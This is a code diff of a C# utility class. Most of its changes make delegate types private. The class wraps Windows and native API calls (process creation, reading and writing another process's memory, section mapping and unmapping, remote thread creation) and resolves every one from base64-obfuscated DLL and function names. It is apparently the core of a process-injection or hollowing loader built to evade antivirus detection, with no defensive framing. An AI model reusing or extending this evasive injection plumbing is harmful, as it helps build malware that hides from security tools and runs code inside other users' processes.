@@ -117,7 +117,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
 */
 
-public static class Utility
+public class Utility
 {
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
     public struct STARTUPINFO
@@ -320,7 +320,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate void SleepDelegate(uint dwMilliseconds);
+    private delegate void SleepDelegate(uint dwMilliseconds);
     public static void Sleep(uint dwMilliseconds)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "U2xlZXA=");
@@ -330,7 +330,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
     public static bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "Q3JlYXRlUHJvY2Vzc0E=");
@@ -343,7 +343,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate UInt32 ZwQueryInformationProcessDelegate(IntPtr hProcess, Int32 procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
+    private delegate UInt32 ZwQueryInformationProcessDelegate(IntPtr hProcess, Int32 procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
     public static UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen)
     {
         IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "WndRdWVyeUluZm9ybWF0aW9uUHJvY2Vzcw==");
@@ -355,7 +355,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+    private delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
     public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, ref IntPtr lpNumberOfBytesRead)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "UmVhZFByb2Nlc3NNZW1vcnk=");
@@ -367,7 +367,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr GetCurrentProcessDelegate();
+    private delegate IntPtr GetCurrentProcessDelegate();
     public static IntPtr GetCurrentProcess()
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "R2V0Q3VycmVudFByb2Nlc3M=");
@@ -376,7 +376,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
+    private delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
     public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "T3BlblByb2Nlc3M=");
@@ -386,7 +386,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
     public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, ref IntPtr lpNumberOfBytesWritten)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "V3JpdGVQcm9jZXNzTWVtb3J5");
@@ -396,7 +396,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate UInt32 NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
+    private delegate UInt32 NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
     public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection)
     {
         IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==");
@@ -408,7 +408,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate UInt32 NtCreateSectionDelegate(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
+    private delegate UInt32 NtCreateSectionDelegate(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
     public static UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle)
     {
         IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRDcmVhdGVTZWN0aW9u");
@@ -420,7 +420,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtMapViewOfSectionDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+    private delegate uint NtMapViewOfSectionDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
     public static uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
     {
         IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRNYXBWaWV3T2ZTZWN0aW9u");
@@ -434,7 +434,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtUnmapViewOfSectionDelegate(IntPtr hProc, IntPtr baseAddr);
+    private delegate uint NtUnmapViewOfSectionDelegate(IntPtr hProc, IntPtr baseAddr);
     public static uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
     {
         IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRVbm1hcFZpZXdPZlNlY3Rpb24=");
@@ -444,7 +444,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate int NtCloseDelegate(IntPtr hObject);
+    private delegate int NtCloseDelegate(IntPtr hObject);
     public static int NtClose(IntPtr hObject)
     {
         IntPtr funcAddr = GetFunctionAddress("bnRkbGwuZGxs", "TnRDbG9zZQ==");
@@ -454,7 +454,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     public static IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "Q3JlYXRlUmVtb3RlVGhyZWFk");
@@ -465,7 +465,7 @@ public static class Utility
 
     /*
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr OpenThreadDelegate(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+    private delegate IntPtr OpenThreadDelegate(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
     public static IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "T3BlblRocmVhZA==");
@@ -475,7 +475,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate int SuspendThreadDelegate(IntPtr hThread);
+    private delegate int SuspendThreadDelegate(IntPtr hThread);
     public static int SuspendThread(IntPtr hThread)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "U3VzcGVuZFRocmVhZA==");
@@ -485,7 +485,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
+    private delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
     public static bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "R2V0VGhyZWFkQ29udGV4dA==");
@@ -497,7 +497,7 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
+    private delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
     public static bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "U2V0VGhyZWFkQ29udGV4dA==");
@@ -510,7 +510,7 @@ public static class Utility
     */
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint ResumeThreadDelegate(IntPtr hThread);
+    private delegate uint ResumeThreadDelegate(IntPtr hThread);
     public static uint ResumeThread(IntPtr hThread)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "UmVzdW1lVGhyZWFk");
@@ -521,7 +521,7 @@ public static class Utility
 
     /*
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool CloseHandleDelegate(IntPtr hObject);
+    private delegate bool CloseHandleDelegate(IntPtr hObject);
     public static bool CloseHandle(IntPtr hObject)
     {
         IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "Q2xvc2VIYW5kbGU=");
